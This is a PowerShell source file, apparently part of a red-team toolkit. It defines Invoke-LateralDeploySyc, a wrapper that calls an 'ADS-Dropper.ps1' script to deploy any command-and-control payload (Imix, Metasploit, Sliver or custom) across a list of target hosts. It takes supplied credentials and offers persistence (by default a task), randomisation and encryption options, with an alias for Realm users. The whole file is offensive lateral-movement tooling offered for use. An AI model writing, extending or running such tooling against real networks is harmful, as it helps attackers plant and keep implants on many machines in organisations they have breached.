<#
.SYNOPSIS
    C2-Agnostic wrapper for ADS-Dropper lateral deployment (backwards compatible).
#>

function Invoke-LateralDeploySyc {
    [CmdletBinding()] param(
        [Parameter(Mandatory)][string[]]$TargetHosts,
        [Parameter(Mandatory)][object]$Payload,  # Any C2: Imix/MSF/Sliver/custom
        [PSCredential]$Credential,
        [string[]]$Persist = @('task'),
        [switch]$Randomize,
        [switch]$Encrypt
    )
    
    # Navigate to ADS-Dropper directory and invoke main tool
    $adsDropperPath = Join-Path (Split-Path $PSScriptRoot) "ADS-Dropper.ps1"
    if(!(Test-Path $adsDropperPath)) {
        throw "ADS-Dropper.ps1 not found at $adsDropperPath"
    }
    
    Write-Host "🚀 Lateral deployment via ADS-Dropper → $($TargetHosts -join ',')" -ForegroundColor Cyan
    & $adsDropperPath -Payload $Payload -Targets $TargetHosts -Persist $Persist -Randomize:$Randomize -Encrypt:$Encrypt -Credential $Credential
}

# Backwards-compatible alias (Realm users)
Set-Alias -Name LateralDeploy -Value Invoke-LateralDeploySyc
